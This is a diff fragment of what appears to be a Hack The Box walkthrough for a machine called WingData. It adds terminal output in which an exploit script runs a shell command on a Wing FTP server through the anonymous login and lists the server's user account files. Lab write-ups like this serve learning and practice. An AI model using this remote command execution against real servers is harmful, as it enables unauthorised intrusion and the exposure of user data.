@@ -125,6 +125,25 @@ ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "
 ./webadmin/crossdomain.xml
 ./webclient/crossdomain.xml
 ----------------------
-ajdev@rootbox:~/HTB/WingData$
+```
+
+```
+ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "ls -la Data/1/users"
+
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls -la Data/1/users' and username: 'anonymous'
+[+] UID extracted: f01c084b102c656ca858d59a1f8c7fe4f528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: f01c084b102c656ca858d59a1f8c7fe4f528764d624db129b32c21fbca0cb8d6
+
+--- Command Output ---
+total 28
+drwxr-x--- 2 wingftp wingftp 4096 Feb 14 22:54 .
+drwxr-x--- 4 wingftp wingftp 4096 Feb  9 08:19 ..
+-rwxr-x--- 1 wingftp wingftp 2843 Feb 14 22:54 anonymous.xml
+-rwxr-x--- 1 wingftp wingftp 2846 Nov  2 11:13 john.xml
+-rw-rw-rw- 1 wingftp wingftp 2847 Nov  2 12:05 maria.xml
+-rw-rw-rw- 1 wingftp wingftp 2847 Nov  2 12:02 steve.xml
+-rw-rw-rw- 1 wingftp wingftp 2856 Nov  2 12:28 wacky.xml
+----------------------
 ```
 
